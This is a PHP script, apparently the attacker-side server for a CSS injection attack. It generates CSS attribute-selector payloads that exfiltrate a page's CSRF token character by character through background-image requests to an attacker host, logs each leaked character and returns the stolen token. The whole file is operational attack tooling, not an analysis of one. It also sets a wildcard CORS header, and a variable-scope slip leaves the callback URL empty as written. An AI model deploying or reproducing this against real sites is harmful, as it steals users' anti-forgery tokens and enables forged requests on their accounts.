<?php
/* code inspired from: https://www.curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html */
header("Access-Control-Allow-Origin: *"); // remove CORS issues :) DO NOT DO THAT IN PRODUCTION

$attacker_ip = "FIXME";

if (!empty($_GET['payload'])) {
    echo urlencode(getCurrentPayload());
} else if (!empty($_GET['clear'])) {
    clearLog();
} else if (!empty($_GET['csrf_token'])) {
    echo csrf_token();
} else {
    $character = str_replace("/index.php/", "", $_SERVER['PHP_SELF']);
    logCharacter($character);
}
function getCurrentPayload() {
    $url = "http://" . $attacker_ip;
    $callback = $url . '/index.php/';
    $previous = readLog();

    // yeah, I don't know how to format in PHP :D
    $begin = "{} ";
    $base_1 = "input[name%3D'csrf'][value^%3D'";
    $base_2 = "'] { background-image: url(" . $callback . "";
    $base_3 = "); } ";
    $end = "";
    $charset = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9" , "a", "b", "c", "d", "e", "f");


    $payload = $begin;
    foreach ($charset as $char) {
        $guess = $previous . $char; // $previous contain the already fetched chars, $char contains next guessed char
        $payload_c = $base_1 . $guess . $base_2 . $char . $base_3; // payload for one char
        $payload .= $payload_c;
    }
    return $payload;
}

function logCharacter($character) {
    file_put_contents('./log.txt', $character, FILE_APPEND | LOCK_EX);
}
function readLog() {
    return file_get_contents('./log.txt');
}

function clearLog() {
    file_put_contents('./log.txt', '');
}

function csrf_token() {
    return readLog();
}